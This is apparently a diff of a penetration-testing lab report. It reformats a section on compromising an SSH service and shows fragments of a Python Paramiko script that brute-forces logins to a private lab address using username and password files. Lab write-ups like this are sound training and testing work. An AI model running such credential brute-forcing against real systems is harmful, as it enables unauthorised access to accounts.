@@ -78,9 +78,12 @@ Steps to exploit the SSH service:
 
 ## Task 1.2 – Compromise Using Custom Script
 
-- Developed a **Python script**:
-  ```
-  import paramiko
+## 🔐 Custom SSH Brute-Force Script (Python + Paramiko)
+
+This script automates brute-force login attempts to the SSH service using combinations from `user.txt` and `pass.txt`.
+
+```python
+import paramiko
 import time
 
 host = "192.168.100.138"
@@ -113,8 +116,8 @@ with open(user_file, "r") as users:
                 if try_login(user, pwd):
                     exit(0)
                 time.sleep(1)  # Wait 1 second to avoid banner issues
-  ```
 
+ 
 ---
 
 ## 5. Conclusion
